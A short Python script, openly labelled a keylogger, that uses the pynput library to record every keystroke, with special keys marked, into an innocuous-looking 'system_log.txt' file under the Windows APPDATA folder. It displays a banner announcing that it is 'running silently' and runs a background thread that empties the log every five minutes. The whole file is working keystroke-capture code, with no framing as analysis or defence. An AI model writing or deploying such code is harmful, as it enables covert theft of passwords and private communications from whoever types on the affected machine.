import os
import time
from pynput import keyboard
from pynput.keyboard import Key, Listener
import threading

import ctypes

# Define the log file path
log_file = os.environ.get('APPDATA') + '\\system_log.txt'

def print_ui():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[34m") 
    print(r"""
                                    ..         .    
  ..                        < .z@8"`        @88>  
 @L             x.    .      !@88E          %8P   
9888i   .dL   .@88k  z88u    '888E   u       .    
`Y888k:*888. ~"8888 ^8888     888E u@8NL   .@88u  
  888E  888I   8888  888R     888E`"88*"  ''888E` 
  888E  888I   8888  888R     888E .dN.     888E  
  888E  888I   8888  888R     888E~8888     888E  
  888E  888I   8888 ,888B .   888E '888&    888E  
 x888N><888'  "8888Y 8888"    888E  9888.   888&  
  "88"  888    `Y"   'YP    '"888*" 4888"   R888" 
        88F                    ""    ""      ""   
       98"                                        
     ./"                                          
    ~`                                            
    """)
    print("\033[0m")  
    print("Keylogger is running silently...")
    print("Press CTRL+C to exit.\n")

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        special_keys = {
            Key.space: ' ',
            Key.enter: '\n',
            Key.tab: '\t',
            Key.backspace: '[BACKSPACE]',
            Key.esc: '[ESC]',
            Key.shift: '[SHIFT]',
            Key.ctrl_l: '[CTRL]',
            Key.alt_l: '[ALT]',
            Key.caps_lock: '[CAPS LOCK]',
        }
        with open(log_file, 'a') as f:
            f.write(special_keys.get(key, f'[{key}]'))

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def clear_log():
    while True:
        time.sleep(300)  # Clear every 5 minutes
        with open(log_file, 'w') as f:
            f.write('')

if __name__ == '__main__':
    print_ui()

    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    clear_thread = threading.Thread(target=clear_log)
    clear_thread.daemon = True
    clear_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nKeylogger stopped.")

input("Press ENTER to exit...")
